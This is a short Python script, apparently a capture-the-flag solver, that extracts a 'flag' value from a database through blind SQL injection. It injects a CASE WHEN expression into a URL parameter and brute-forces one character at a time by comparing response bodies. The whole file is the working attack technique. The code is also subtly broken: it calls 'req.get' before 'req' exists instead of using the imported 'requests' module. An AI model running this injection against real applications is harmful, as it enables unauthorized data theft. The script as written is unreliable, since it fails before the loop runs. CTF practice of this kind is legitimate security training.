import requests 
import string

url = '' 
flag = ''
cnt = 1 
chars = string.ascii_letters + string.digits + "{}"
hit = req.get(url + "title").text


while flag.endswith("}") == False:
    for c in chars:
        payload = f"(CASE WHEN (SELECT SUBSTRING(flag, {cnt}, 1) FROM flag) = '{c}' THEN title ELSE date END)"
        try: 
            req = requests.get(url + payload)
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            continue
        if req.text == hit:
            flag += c
            print(f"[+] curr : {flag}")
            cnt += 1
            break



print(f"flag: {flag}")
